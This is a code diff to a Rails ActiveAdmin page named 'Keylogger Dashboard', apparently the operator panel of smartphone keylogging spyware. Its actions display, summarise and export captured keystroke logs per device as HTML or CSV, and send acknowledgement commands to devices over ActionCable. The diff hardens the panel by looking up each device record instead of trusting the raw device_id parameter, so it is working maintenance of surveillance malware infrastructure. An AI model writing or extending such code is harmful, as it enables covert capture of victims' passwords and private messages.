@@ -142,7 +142,8 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
   end
 
   page_action :view_keylog, method: :get do
-    cached = Rails.cache.read("keylog_#{params[:device_id]}")
+    device = Smartphone.find_by!(device_id: params[:device_id])
+    cached = Rails.cache.read("keylog_#{device.device_id}")
     if cached
       processor = KeylogProcessor.new(cached[:data])
       render html: processor.to_html_report
@@ -152,17 +153,19 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
   end
 
   page_action :stats_keylog, method: :get do
-    cached = Rails.cache.read("keylog_#{params[:device_id]}")
+    device = Smartphone.find_by!(device_id: params[:device_id])
+    cached = Rails.cache.read("keylog_#{device.device_id}")
     render(cached && cached[:processed] ? { json: cached[:processed] } : { json: { error: 'No data' }, status: :not_found })
   end
 
   page_action :export_keylog, method: :get do
-    cached = Rails.cache.read("keylog_#{params[:device_id]}")
+    device = Smartphone.find_by!(device_id: params[:device_id])
+    cached = Rails.cache.read("keylog_#{device.device_id}")
     if cached
       processor = KeylogProcessor.new(cached[:data])
       case params[:format] || 'html'
       when 'csv'
-        send_data processor.to_csv, filename: "keylog_#{params[:device_id]}_#{Time.current.to_i}.csv", type: 'text/csv'
+        send_data processor.to_csv, filename: "keylog_#{device.device_id}_#{Time.current.to_i}.csv", type: 'text/csv'
       when 'html'
         render html: processor.to_html_report
       end
@@ -172,15 +175,17 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
   end
 
   page_action :ack_keylog, method: :post do
+    device = Smartphone.find_by!(device_id: params[:device_id])
     success = params[:success] == 'true'
-    ActionCable.server.broadcast("commands_#{params[:device_id]}", { command: 'keylog_ack', data: { success: success, timestamp: Time.current.to_i } })
-    Rails.cache.delete("keylog_#{params[:device_id]}") if success
-    redirect_to admin_keylogger_dashboard_path, notice: "ACK sent to #{params[:device_id][0..7]}"
+    ActionCable.server.broadcast("commands_#{device.device_id}", { command: 'keylog_ack', data: { success: success, timestamp: Time.current.to_i } })
+    Rails.cache.delete("keylog_#{device.device_id}") if success
+    redirect_to admin_keylogger_dashboard_path, notice: "ACK sent to #{device.device_id[0..7]}"
   end
 
   page_action :clear_keylog_cache, method: :post do
-    Rails.cache.delete("keylog_#{params[:device_id]}")
-    redirect_to admin_keylogger_dashboard_path, notice: "Cleared #{params[:device_id][0..7]}"
+    device = Smartphone.find_by!(device_id: params[:device_id])
+    Rails.cache.delete("keylog_#{device.device_id}")
+    redirect_to admin_keylogger_dashboard_path, notice: "Cleared #{device.device_id[0..7]}"
   end
 
   page_action :clear_all_keylog_caches, method: :post do
